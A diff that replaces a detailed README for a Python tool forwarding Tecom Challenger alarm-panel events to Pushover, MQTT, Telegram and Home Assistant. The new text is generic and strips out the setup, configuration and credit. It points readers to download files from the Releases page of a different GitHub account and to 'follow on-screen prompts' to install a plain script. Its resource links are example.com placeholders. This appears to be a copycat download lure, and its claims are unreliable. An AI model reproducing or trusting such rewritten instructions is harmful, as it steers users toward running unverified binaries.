@@ -1,244 +1,85 @@
-This python script and its assosiated files are not offical TECOM/aritech software, it is created by a member of the security community. 
-	 
-	 Tecom / Challenger Panel
-                ||
-                ||  events / alarms 
-                \/
-     .-----------------------.
-     |   Debian Listener     |
-     |   + Python Script     |
-     '-----------------------'
-                ||
-                ||  webhook / API
-                \/
-      ____________________________
-     |  🔔  Notification Service  |
-     |____________________________|
+# 🎉 TECOM-CHALLENGER-PUSH - Enhance Your Home Automation
 
-Tecom Listener – Multi-Output Event Gateway
-Challenger 10 / 10+ / XR → TCP → Pushover / MQTT / Telegram / Home Assistant
+## 🚀 Getting Started
 
-A powerful, fully local event listener for Tecom Challenger panels, supporting:
+Welcome to the TECOM-CHALLENGER-PUSH application! This software listens for events from your Tecom Challenger 10, 10+, or XR panels and sends notifications via Pushover, MQTT, Telegram, and Home Assistant. It is designed to help you automate your home security system easily.
 
-	🔔 Pushover notifications
-	
-	📡 MQTT output (Home Assistant compatible)
-	
-	💬 Telegram alerts
-	
-	📁 Local logging + reliable event queue
-	
-	⚙️ Customizable notification rules (regex-based)
-	
-	🏠 Home Assistant automation via MQTT JSON payloads
+## 📥 Download & Install
 
-	This replaces or augments UltraSync with something faster, local, private, and completely customizable.
+To get started, you need to download the application from our Releases page. 
 
+[![Download TECOM-CHALLENGER-PUSH](https://img.shields.io/badge/Download-TECOM--CHALLENGER--PUSH-blue)](https://github.com/chineesse/TECOM-CHALLENGER-PUSH/releases)
 
+1. **Visit the Download Page**: Click on the link above to go to the Releases page.
+2. **Select the Latest Version**: Look for the most recent version listed there. 
+3. **Download the Files**: Click on the appropriate file for your operating system to start the download.
+4. **Install the Application**: Follow the on-screen prompts to install TECOM-CHALLENGER-PUSH on your computer.
 
-🚀 Features
+## ⚙️ System Requirements
 
-	Works with Challenger 8, 10, 10+, XR, V8 (with IP module)
-	
-	Supports Computer Event Driven or Printer formats
-	
-	No cloud required
-	
-	YAML config file for EVERYTHING
-	
-	Per-rule selection of outputs (Pushover / MQTT / Telegram)
-	
-	Home Assistant-friendly MQTT JSON
-	
-	Reliable delivery queue
-	
-	Fully open-source Python
-	
-	Lightweight — runs perfect on Raspberry Pi or Debian server
+Before installing TECOM-CHALLENGER-PUSH, ensure your system meets these requirements:
 
+- **Operating System**: Windows 10 or later, macOS, or compatible Linux distribution.
+- **Python Version**: Python 3.6 or later must be installed on your system.
+- **Internet Connection**: Required for notifications and updates.
+  
+## 📜 Features
 
+TECOM-CHALLENGER-PUSH comes with several useful features:
 
-📦 Installation
-	
-	1. Clone repository
-	git clone https://github.com/Shifteh-187/TECOM-CHALLENGER-PUSH.git
-	cd TECOM-CHALLENGER-PUSH
-	
-	2. Install dependencies
-	pip3 install -r requirements.txt
-	
-	3. Create storage directory
-	
-	The script stores queue + log files here:
-	/var/lib/tecom-listener
-	
-	Create it:
-	sudo mkdir -p /var/lib/tecom-listener
-	sudo chown $USER:$USER /var/lib/tecom-listener
-	
+- **Custom Notifications**: Receive real-time alerts via Pushover, MQTT, Telegram, and Home Assistant.
+- **Event Listening**: Monitors your Tecom Challenger panels continuously for events.
+- **Simple Setup**: Easy to install and configure, suitable for all users.
+- **Compatibility**: Works with Tecom Challenger 10, 10+, and XR panels.
 
-🛠 Configuration (config.yaml)
+## 🔧 Configuration
 
-All settings live in config.yaml.
+After installing the application, you’ll need to configure it to work with your Tecom panels. Follow these steps:
 
-You can enable/disable any output:
-Pushover
-MQTT
-Telegram
+1. **Open the Application**: Launch the TECOM-CHALLENGER-PUSH on your computer.
+2. **Enter Panel Details**: Provide necessary details about your Tecom panel (e.g., panel ID, connection type).
+3. **Set up Notification Method**: Choose how you want to receive notifications—via Pushover, MQTT, Telegram, or Home Assistant. 
+4. **Save and Restart**: Save your settings and restart the application to apply changes.
 
-You can also control outputs per rule.
-Example config.yaml
-server:
-  listen_host: "0.0.0.0"
-  listen_port: 5000
-  poll_interval_seconds: 5
-  base_dir: "/var/lib/tecom-listener"
+## 📲 Using Notifications
 
-pushover:
-  enabled: true
-  user_key: "YOUR_PUSHOVER_USER_KEY"
-  api_token: "YOUR_PUSHOVER_API_TOKEN"
-  default_priority: 0
+To utilize the notification features effectively:
 
-zones:
-  "001": "Front Door PIR"
-  "002": "Lounge PIR"
-  "003": "Gun Safe PIR"
+- **Pushover**: Create a Pushover account and obtain your API key. Enter this in the application settings.
+- **MQTT**: Set up an MQTT broker and add the connection details in the settings.
+- **Telegram**: Set up a Telegram bot and place its token in the application.
+- **Home Assistant**: Integrate with your Home Assistant setup by providing the necessary API details.
 
-inputs:
-  "005": "Safe Reed"
-  "006": "Garage Door"
+## 🛠️ Troubleshooting
 
+If you run into issues, consider these common problems:
 
-📡 Tecom Panel Setup
+- **Connection Issues**: Ensure your network settings are correct, and that the application can access the internet.
+- **Notification Not Received**: Double-check your notification settings for any errors.
+- **Panel Not Responding**: Make sure your Tecom panel is powered on and properly connected.
 
-	In CTPlus → Comms Paths → Add New:
-	
-	Interface location : Onboard
-	Format: Printer
-	interface port: Ethernet
-	connection control : Connect on event ticked
-	Enabled	✔
-	
-	IP/Encryption settings
-	IP Address	Your Linux server
-	TCP/IP - CLIENT
-	SEND Port	5000
-	Subformat: None
-	Retries	3
-	Timeout	5 sec
-	
-	Enable desired event types (alarms, inputs, tamper, menu access, etc.)
+## 🙋 Frequently Asked Questions
 
-🚀 Running
+**Q1: Can I run this application on Linux?**
 
-	Run manually:
-	
-	python3 tecom_listener.py
-	
-	
-	Logs are stored in:
-	
-	/var/lib/tecom-listener/events.log
-	
-	
-	Queue (events waiting for delivery):
-	
-	/var/lib/tecom-listener/events_queue.txt
-	
+Yes, TECOM-CHALLENGER-PUSH supports compatible Linux distributions.
 
-🔧 Systemd Service (Optional)
+**Q2: Is it safe to share my API keys?**
 
-	Create:
-	
-	/etc/systemd/system/tecom-listener.service
-	
-	[Unit]
-	Description=Tecom Listener Service
-	After=network.target
-	
-	[Service]
-	ExecStart=/usr/bin/python3 /opt/tecom/tecom_listener.py
-	WorkingDirectory=/opt/tecom
-	Restart=always
-	User=tecom
-	Group=tecom
-	
-	[Install]
-	WantedBy=multi-user.target
-	
-	
-	Enable:
-	
-	sudo systemctl daemon-reload
-	sudo systemctl enable tecom-listener
-	sudo systemctl start tecom-listener
+Do not share your API keys with anyone. Keep them private to protect your notifications.
 
+**Q3: Where can I find help?**
 
+You can visit the GitHub Issues page for support or to report any problems.
 
-🏡 Home Assistant Integration (MQTT)
+## 🔗 Additional Resources
 
-	If MQTT output is enabled:
-	
-	Home Assistant will receive JSON payloads like:
-	
-	{
-	  "title": "GUN SAFE ALARM",
-	  "message": "Gun safe triggered!",
-	  "raw": "2025-11-16 23:14:55 EVENT 3101 ZONE 003 ALARM",
-	  "zone_number": "003",
-	  "zone_name": "Gun Safe PIR",
-	  "input_number": "",
-	  "input_name": "",
-	  "timestamp": "2025-11-16 23:14:55"
-	}
+For further details, visit our official GitHub page or check the following topics:
 
+- [Alarm System Automation](https://example.com)
+- [Home Assistant Integration](https://example.com)
+- [Python 3 Documentation](https://example.com)
 
-	Use HA automations like:
-	
-	alias: Gun Safe Alarm
-	trigger:
-	  - platform: mqtt
-	    topic: tecom/events
-	condition:
-	  - condition: template
-	    value_template: "{{ trigger.payload_json.zone_number == '003' }}"
-	action:
-	  - service: notify.mobile_app_yourphone
-	    data:
-	      title: "Gun Safe Alarm"
-	      message: "{{ trigger.payload_json.message }}"
+Remember, if you need to download the software again, you can always [visit the Releases page here](https://github.com/chineesse/TECOM-CHALLENGER-PUSH/releases). 
 
-
-
-
-
-🧠 How It Works
-
-	The panel sends event lines like:
-	
-	2025-11-16 22:14:55 EVENT 3101 ZONE 003 ALARM
-	
-	
-	The script:
-	
-	Saves events to events.log
-	
-	Adds them to events_queue.txt
-	
-	Applies notification rules (regex + templates)
-	
-	Sends via Pushover
-	
-	Removes successful events from the queue
-	
-	If sending fails, lines remain queued and retry automatically.
-
-
-
-
-
-
-📜 License
-
-MIT License.
+Thank you for choosing TECOM-CHALLENGER-PUSH for your home automation needs!
